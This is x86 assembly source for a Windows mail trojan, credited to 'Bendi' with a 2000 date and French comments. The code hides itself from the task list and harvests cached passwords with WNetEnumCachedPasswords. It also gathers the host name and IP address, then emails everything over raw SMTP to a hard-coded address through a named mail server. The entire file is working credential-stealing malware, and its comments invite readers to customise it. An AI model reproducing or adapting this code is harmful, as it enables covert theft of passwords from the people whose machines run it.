;*******************************************************************
; HTTP://BXT.TSX.ORG
;*******************************************************************
;*  17/12/2000  # Mail Trojan  #  (C) Bendi  # bendi@angelfire.com *
;*******************************************************************
; Ce programme creer un timer, toutes les minutes il essayes de
; se connecter a un serveur de mails , si il reussie il envoie a
; l'adresse specifier les mots passe enregistrer sur l'ordinateur
; plus le nom de la machine en reseaux plus l'adresse IP
; si tout se passe sans probleme alors le programme creer un fichier
; bendi.ini , a chaque demarage le programme teste la presence de
; ce fichier si il existe le programme s'arrete
;********************************************************************

.586P
LOCALS
JUMPS
.MODEL FLAT , STDCALL

include .\inc\win32.inc			; definitions des constantes de windows
includelib .\lib\win32.lib		; librairie kernel32 , user32, etc ..
includelib .\lib\wsock32.lib		; librairie winsock
includelib .\lib\mpr.lib		; pour la dll mpr.dll

extern ExitProcess 	: proc 
extern MessageBoxA 	: proc 
extern WNetEnumCachedPasswords : proc
extern lstrcpynA : proc
extern WSAStartup : proc
extern socket : proc
extern htons : proc
extern htonl : proc
extern bind : proc
extern gethostbyname : proc
extern connect : proc
extern recv : proc
extern send : proc
extern gethostname : proc
extern lstrcpyA : proc
extern inet_ntoa : proc
extern SetTimer : proc
extern KillTimer : proc
extern WaitMessage : proc
extern GetMessageA: proc
extern WSACleanup : proc
extern RegisterServiceProcess : proc
extern CreateFileA : proc
extern CloseHandle : proc

wVersionRequested 	equ 	101h	; j'ai ete obliger de debuguer une application pour trouver cette valeur : impossible de la trouver dans un fichier H !!!

.DATA

file		db	'bendi.ini',0

buffer		db	1000 dup (0)
namer		db	50 dup(0)
address_ip	db	16 dup (0)

titre 		db	'Mail send by bendi trojan !',0
namer_t		db	'Nom de ordi en reseau: ',0

address_ip_t	db	'Adresse IP: ',0

buffer_t	db	'Liste des pass enregistr�s :',13,10,0

retour		db	13,10,0

pointeur	dd 	offset buffer
temp		dd 0
sockets		dd 0
sin SOCKADDR_IN <>

serveur		db	'mail.skreel.org',0

wsdata WSADATA <>

status		dd 0

step1		db	'HELO angelfire.com',13,10,0
step2		db	'MAIL FROM:jean12@wanadoo.fr',13,10,0
step3		db	'RCPT TO:bxt@angelfire.com',13,10,0
step4		db	'DATA',13,10,0
step5		db	13,10,'.',13,10,0
step6		db	'QUIT',13,10,0

br		db	1

idtimer		dd	0

.CODE

main:						

call	RegisterServiceProcess, 0, 1		; cache le prgramme dans ALT+CTRL+SUPPR

call	CreateFileA, offset file, 0, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0 ; teste la precence de bendi.ini

cmp 	eax,INVALID_HANDLE_VALUE
jne	deja_fait						; si il existe bye !

call 	WNetEnumCachedPasswords, 0, 0, 0FFh, offset checkpwd, 0	; recupere la liste des mots de passe enregistrer

; pour plus de details sur cette api je vous conseil de debuguer l'utilitaire fournie sur le cdrom de windows qui
; permet de lister les mots de passe enregistre

call	SetTimer , 0 , 0 , 60000 , 0	; creer un timer de 60 seconde

mov 	idtimer,eax

error:

call	WaitMessage			; attend le message du timer > rend la main a windows

call	WSACleanup			; ferme winsock si le programme revient d'une erreur il est possible qu'il est ouvert

call 	WSAStartup, wVersionRequested , offset wsdata ;

call 	gethostname, offset namer, 50	; recupere le nom de la machine

cmp 	eax,0
jne 	error

call 	gethostbyname, offset namer	; recupere l'ip de la machine en indiquand le nom

cmp 	eax,0
je 	error

add 	eax,h_addr_list
mov 	ebx,[eax] 		; ebx=pointeur vers une liste de pointeur
mov 	ebx,[ebx] 		; ebx=pointeur vers l'adresse sous forme network
mov 	ebx,[ebx] 		; ebx=l'adresse

call 	inet_ntoa,ebx			; convertie en la forme "xxx.xxx.xxx.xxx"

cmp 	eax,0
je 	error

call 	lstrcpyA, offset address_ip, eax

call 	socket,AF_INET, SOCK_STREAM, 0	; creer un socket
mov 	sockets,eax

cmp 	eax,-1
je 	error

mov 	sin.sin_family,AF_INET

call 	htons,25
mov 	sin.sin_port,ax

call	gethostbyname, offset serveur		; recupere l'ip du serveur de mail

cmp 	eax,0
je 	error

add 	eax,h_addr_list
mov 	ebx,[eax] ; ebx=pointeur vers une liste de pointeur
mov 	ebx,[ebx] ; ebx=pointeur vers l'adresse sous forme network
mov 	ebx,[ebx] ; ebx=l'adresse
mov 	dword ptr [sin.sin_addr],ebx

call 	connect, sockets, offset sin, SOCKADDR_IN_	; se connecte au serveur

cmp 	eax,-1
je 	error

call 	recv, sockets , offset status, 4, 0		; recois les 4 premiers octets en provenance du serveur qui contient

; le code de bienvenue et par la suite le code de confirmation ou erreur

cmp 	eax,-1
je 	error

call	vide_buffer					; vide le reste des caracteres


cmp	[status],' 022'					; verifie que le serveur nous envoie bien le code 22 qui indique qu'il fonctionne correctement
jne	error

call	send_str, offset step1				; on envoie la premiere etape (autenfication)

cmp	eax,0
je 	error

call 	recv, sockets , offset status, 4, 0		; on verifie que ce soit ok , etc ...........

cmp 	eax,-1
je 	error

cmp	[status],' 052'
jne	error

call	vide_buffer

call	send_str, offset step2

cmp	eax,0
je 	error

call 	recv, sockets , offset status, 4, 0

cmp 	eax,-1
je 	error

cmp	[status],' 052'
jne	error

call	vide_buffer


call	send_str, offset step3

cmp	eax,0
je 	error

call 	recv, sockets , offset status, 4, 0

cmp 	eax,-1
je 	error

cmp	[status],' 052'
jne	error

call	vide_buffer

call	send_str, offset step4

cmp	eax,0
je 	error

call 	recv, sockets , offset status, 4, 0

cmp 	eax,-1
je 	error

cmp	[status],' 453'
jne	error

call	vide_buffer


;**********************************************
;
; ENVOIE DES INFORMATIONS
;
; (vous pouvez rajoutez vos lignes ici :)
;
;
;**********************************************


call	send_str, offset titre
cmp	eax,0
je 	error
call	send_str, offset retour
cmp	eax,0
je 	error
call	send_str, offset retour
cmp	eax,0
je 	error
call	send_str, offset namer_t
cmp	eax,0
je 	error
call	send_str, offset namer
cmp	eax,0
je 	error
call	send_str, offset retour
cmp	eax,0
je 	error
call	send_str, offset retour
cmp	eax,0
je 	error
call	send_str, offset address_ip_t
cmp	eax,0
je 	error
call	send_str, offset address_ip
cmp	eax,0
je 	error
call	send_str, offset retour
cmp	eax,0
je 	error
call	send_str, offset retour
cmp	eax,0
je 	error
call	send_str, offset buffer_t
cmp	eax,0
je 	error
call	send_str, offset buffer

call	send_str, offset step5

cmp	eax,0
je 	error

call 	recv, sockets , offset status, 4, 0

cmp	eax,-1
je 	error

cmp	[status],' 052'
jne	error

call	vide_buffer

call	send_str, offset step6

cmp	eax,0
je 	error

call 	recv, sockets , offset status, 4, 0

cmp	eax,-1
je 	error

cmp	[status],' 122'
jne	error

call	vide_buffer

call	CreateFileA, offset file, 0, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL , 0	; creer le fichier bendi.ini

call	CloseHandle,eax			; ferme le fichier

call	KillTimer, 0 , idtimer		; ferme le timer

deja_fait:

call 	ExitProcess,0			; bye !

error2:

add 	esp,4
jmp	error


;******************************************
vide_buffer proc
;******************************************
; vide le buffer des donnes a recevoir
;******************************************


cmp 	byte ptr [br],10			; test si retour de ligne present
je 	vide					; si oui terminer

call 	recv, sockets , offset br, 1, 0		; on recoit un octet

cmp	eax,-1
je 	error2

jmp 	vide_buffer

vide:
mov 	br,1					; mais une valeur differente de 10 pour la prochaine execution de cette procedure

ret
endp


;************************************
send_str proc string
;************************************
; envoie d'une chaine (term 0) byte par byte
;************************************

mov 	ebx,string

send_str_d:

cmp	 byte ptr [ebx],0
je 	send_all

call 	send, sockets, ebx, 1, 0

cmp 	eax,-1
je 	erreur_send

inc 	ebx
jmp	send_str_d

erreur_send:

xor eax,eax

send_all:

ret
endp

;***********************************************
checkpwd proc pwd_data, unknow
;***********************************************
;
; recupere les mots de passe enregistrer sur l'ordi
;
; je n'est trouver aucune documentation sur cette procedure
; c en debuguant que j'ai trouver les parametres
; faites de memes si vous voulais personnaliser cette procedure
;
;***********************************************

pushad

mov   	edx,pwd_data

movzx 	ecx,word ptr [edx+2]
mov   	temp,ecx
inc   	ecx

lea   	ebx,[edx+8]
call 	lstrcpynA, pointeur, ebx , ecx

mov 	eax,pointeur
mov 	edx,pwd_data
mov 	dx,word ptr [edx+2]
add 	ax,dx
mov 	byte ptr [eax],'\'
inc 	eax

mov 	edx,pwd_data
movzx 	ebx,word ptr [edx+2]
add 	ebx,edx
add 	ebx,8

movzx 	ecx, word ptr [edx+4]
inc 	ecx

push 	ecx

call 	lstrcpynA, eax, ebx, ecx

pop 	ecx
add 	ecx,temp
add 	pointeur,ecx

mov 	eax,pointeur
mov 	word ptr [eax],0d0ah
add 	pointeur,2

popad
ret

endp 

end main